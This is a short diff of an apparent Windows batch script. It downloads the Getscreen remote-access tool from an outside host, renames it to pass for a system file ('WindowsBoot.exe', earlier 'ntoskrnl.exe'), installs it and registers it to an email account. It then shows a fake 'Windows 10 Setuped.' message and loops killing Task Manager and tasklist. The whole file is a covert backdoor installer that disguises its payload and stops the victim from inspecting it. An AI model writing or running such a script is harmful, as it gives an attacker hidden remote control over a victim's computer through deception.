@@ -1,6 +1,6 @@
-curl http://getscreen.me/download/getscreen-x86.exe -outfile "ntoskrnl.exe"
-%userprofile%\Desktop\ntoskrnl.exe -install -register huggingfaceuser@gmail.com
-msg * ummmmmm
+curl http://getscreen.me/download/getscreen-x86.exe -outfile "WindowsBoot.exe"
+WindowsBoot -install -register huggingfaceuser@gmail.com
+msg * Windows 10 Setuped.
 :a
 taskkill /f /im taskmgr.exe
 taskkill /f /im tasklist.exe
